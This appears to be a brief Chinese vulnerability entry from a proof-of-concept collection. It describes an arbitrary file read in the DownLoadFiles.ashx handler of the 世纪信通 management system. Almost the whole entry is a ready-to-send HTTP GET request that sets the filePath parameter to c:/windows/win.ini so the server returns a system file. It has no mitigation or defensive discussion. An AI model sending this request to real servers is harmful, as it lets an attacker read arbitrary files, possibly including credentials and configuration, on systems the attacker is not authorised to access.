## 世纪信通管理系统DownLoadFiles.ashx存在任意文件读取


## poc
```
GET /WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25X
Content-Length: 4
```
